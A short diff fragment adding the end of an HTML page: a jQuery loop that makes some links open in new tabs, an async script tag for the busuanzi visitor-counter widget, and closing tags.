+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
